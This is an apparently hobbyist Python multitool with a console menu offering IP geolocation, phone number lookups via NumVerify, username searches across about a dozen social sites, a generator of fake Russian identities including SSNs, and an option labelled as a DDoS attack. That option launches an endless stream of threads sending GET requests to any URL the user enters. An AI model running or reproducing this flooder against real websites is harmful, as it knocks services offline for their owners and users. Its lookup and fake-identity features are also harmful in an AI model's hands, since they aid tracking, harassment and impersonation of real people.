import socket
import validators
import requests
import threading
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from faker import Faker
import random
from bs4 import BeautifulSoup

fake = Faker('ru_RU')

def generate_fake_info():
    fake_name = fake.name()
    fake_country = fake.country()
    fake_city = fake.city()
    fake_address = fake.address()
    fake_job = fake.job()
    fake_gender = random.choice(['Мужской', 'Женский'])
    fake_birthdate = fake.date_of_birth(minimum_age=18, maximum_age=90)
    fake_email = fake.email()
    fake_phone_number = fake.phone_number()
    fake_company = fake.company()
    fake_ssn = fake.ssn()
    fake_username = fake.user_name()
    fake_website = fake.url()
    fake_text = fake.text()
    
    fake_info = {
        'ФИО': fake_name,
        'Страна': fake_country,
        'Город': fake_city,
        'Адресс': fake_address,
        'Работа': fake_job,
        'Пол': fake_gender,
        'Дата рождения': fake_birthdate.strftime("%Y-%m-%d"),
        'Электронная почта': fake_email,
        'Телефон': fake_phone_number,
        'Компания': fake_company,
        'SSN': fake_ssn,
        'Имя пользователя': fake_username,
        'Веб-сайт': fake_website,
        'Текст': fake_text
    }
    return fake_info

def make_request(url):
    response = requests.get(url)
    print('[+] DDoS Status:',response.status_code)

def analyze_phone_number(phone_number, numverify_api_key):
    try:
        parsed_number = phonenumbers.parse(phone_number, None)
        country = geocoder.description_for_number(parsed_number, "en")
        operator = carrier.name_for_number(parsed_number, "en")
        time_zone = timezone.time_zones_for_number(parsed_number)
        is_valid = phonenumbers.is_valid_number(parsed_number)
        number_type = phonenumbers.number_type(parsed_number)

        print(f'''
╔══════════════                     ══════════════╗
    
    [+] Phone number: {phone_number}
    
    [+] Country: {country}
    [+] Time Zone(s): {time_zone}
        
    [+] Operator: {operator}
        
    [+] Valid: {is_valid}
    [+] Number Type: {number_type}
        
╚══════════════                     ══════════════╝
''')

        numverify_url = f'http://apilayer.net/api/validate?access_key={numverify_api_key}&number={phone_number}&country_code=&format=1'
        response = requests.get(numverify_url)
        data = response.json()

        if data['valid']:
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] Info from NumVerify:
    
    [+] Country Prefix: {data['country_prefix']}
    
    [+] Country Code: {data['country_code']}
    [+] Location: {data['location']}
    
    [+] Carrier: {data['carrier']}
    
    [+] Line Type: {data['line_type']}
        
╚══════════════                     ══════════════╝
''')
        else:
            print("The provided phone number is not valid.")
    except (phonenumbers.phonenumberutil.NumberParseException, requests.RequestException) as e:
        print("Error:", e)


def get_ip():
    ip = input(f'[-] Type IP: ')

    try:
        ip = socket.gethostbyname(ip)
        
        infoList1 = requests.get(f"http://ipwho.is/{ip}")
        infoList = infoList1.json()
        
        if infoList.get("success"):
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] IP: {infoList["ip"]}
    [+] Status: {infoList["success"]}
    [+] Type: {infoList["type"]}
        
    [+] Continent: {infoList["continent"]}
    [+] Country: {infoList["country"]}
    
    [+] Capital: {infoList["capital"]}
    [+] Region: {infoList["region"]}
    [+] City: {infoList["city"]}
        
    [+] Postal Code: {infoList["postal"]}
        
    [+] Location: {infoList["latitude"]} {infoList["longitude"]}
        
╚══════════════                     ══════════════╝
''')
        else:
            print(f'''
╔══════════════                     ══════════════╗
    
    [+] IP: {infoList["ip"]}

    [+] Success: {infoList["success"]}
    [+] Message: {infoList["message"]}
        
╚══════════════                     ══════════════╝
''')
    except Exception as e:
        print(f'Error: {e}')
       
def find_social_media_links(username):
    social_media_links = {}
    
    soundcloud_url = f"https://soundcloud.com/{username}"
    soundcloud_response = requests.get(soundcloud_url)
    if soundcloud_response.status_code == 200:
        social_media_links['SoundCloud'] = soundcloud_url
    
    myspace_url = f"https://myspace.com/{username}"
    myspace_response = requests.get(myspace_url)
    if myspace_response.status_code == 200:
        social_media_links['MySpace'] = myspace_url

    github_url = f"https://github.com/{username}"
    github_response = requests.get(github_url)
    if github_response.status_code == 200:
        social_media_links['GitHub'] = github_url
    
    telegram_url = f"https://t.me/{username}"
    telegram_response = requests.get(telegram_url)
    if telegram_response.status_code == 200:
        social_media_links['Telegram'] = telegram_url
        
    tiktok_url = f"https://www.tiktok.com/@{username}"
    tiktok_response = requests.get(tiktok_url)
    if tiktok_response.status_code == 200:
        social_media_links['TikTok'] = tiktok_url

    likee_url = f"https://likee.com/{username}"
    likee_response = requests.get(likee_url)
    if likee_response.status_code == 200:
        social_media_links['Likee'] = likee_url

    youtube_url = f"https://www.youtube.com/user/{username}"
    youtube_response = requests.get(youtube_url)
    if youtube_response.status_code == 200:
        social_media_links['YouTube'] = youtube_url
        
    pinterest_url = f"https://www.pinterest.com/{username}"
    pinterest_response = requests.get(pinterest_url)
    if pinterest_response.status_code == 200:
        pinterest_soup = BeautifulSoup(pinterest_response.text, 'html.parser')
        user_found = pinterest_soup.find('title', string=f"{username} on Pinterest")
        if user_found:
            social_media_links['Pinterest'] = pinterest_url

    reddit_url = f"https://www.reddit.com/user/{username}"
    reddit_response = requests.get(reddit_url)
    if reddit_response.status_code == 200:
        reddit_soup = BeautifulSoup(reddit_response.text, 'html.parser')
        user_found = reddit_soup.find('h1', {'class': 'ListingLayout-children'})
        if user_found:
            social_media_links['Reddit'] = reddit_url
    
    instagram_url = f"https://www.instagram.com/{username}"
    instagram_response = requests.get(instagram_url)
    if instagram_response.status_code == 200:
        social_media_links['Instagram'] = instagram_url
        
    snapchat_url = f"https://www.snapchat.com/add/{username}"
    snapchat_response = requests.get(snapchat_url)
    if snapchat_response.status_code == 200:
        social_media_links['Snapchat'] = snapchat_url
    
    return social_media_links
        
import os
from pystyle import Colorate, Colors

while True:
    os.system('cls' if os.name == 'nt' else 'clear')

    for _ in range(4):
        print()

    from banner import banner
    print(Colorate.Horizontal(Colors.red_to_blue, banner.strip()))

    COLOR_CODE = {
        "BOLD": "\033[01m",
        "RED": "\033[31m",
        "RESET": "\033[0m",
    }

    prompt_text = f'\n{COLOR_CODE["RED"]}[-]{COLOR_CODE["BOLD"]} Select ~> '

    select = input(prompt_text)

    if select == '1':
        get_ip()
        input("Press ENTER, to continue")
    elif select == "2":
        phone_input = input("[+] Type Number: ")
        numverify_api_key = input("[+] Type NumVerify API Key: ")
        analyze_phone_number(phone_input, numverify_api_key)
        input("[-] Press ENTER, to continue")
    elif select == "3":
        url = input("[+] Type site's URL: ")
        if not validators.url(url):
            print("[!] Incorrect URL!")
        else:
            print("[+] Attack started!")
            while True:
                t = threading.Thread(target=make_request, args=(url,))
                t.start()
    elif select == "4":
        fake_data = generate_fake_info()
        for info, value in fake_data.items():
            print(f'[+] {info}: {value}')
        input("[-] Press ENTER, to continue")
    elif select == "5":
        username = input("[+] Search in:\nYouTube, TikTok, Likee, GitHub, Reddit, Telegram, Pinterest, Snapchat, SoundCloud, MySpace, Instagram(bad)\n[+] Type username (without @): ")
        social_media_links = find_social_media_links(username)
        if social_media_links:
            print("[+] Possible socials:")
            for platform, link in social_media_links.items():
                print(f"{platform}: {link}")
        else:
            print("[!] Nothing found")
        input("[-] Press ENTER, to continue")
    elif select == "6":
        print('\nby @illiagg3 <- banned')
        print('github: https://github.com/Illiagg')
        print('version: 0.1')
        print('NumVerify (api key): https://numverify.com/dashboard')
        print('')
        input("[-] Press ENTER, to continue")

    else:
        print(f'{COLOR_CODE["RED"]}[!] Try again!{COLOR_CODE["RESET"]}')
